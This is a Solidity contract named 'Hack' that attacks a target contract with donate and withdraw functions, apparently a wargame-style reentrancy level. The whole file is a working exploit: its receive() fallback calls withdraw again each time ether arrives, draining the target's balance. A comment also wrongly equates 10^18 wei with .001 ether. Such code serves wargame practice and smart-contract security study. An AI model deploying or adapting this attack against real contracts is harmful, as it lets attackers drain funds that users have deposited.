// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Reenter{
    function donate(address) external payable;
    function withdraw(uint) external;
}
//1000000000000000000 wei .001 ether

contract Hack {
    Reenter reenter;

    constructor(address _address) public {
        reenter = Reenter(_address);
    }

    function _donate(address _to) public payable {
        reenter.donate{value:msg.value}(_to);
    }

    function hack(uint _value) public payable {
        reenter.withdraw(_value);
    }

    receive() external payable{
        if (address(reenter).balance >= .001 ether) {
            reenter.withdraw(.001 ether);
        }
    }
}
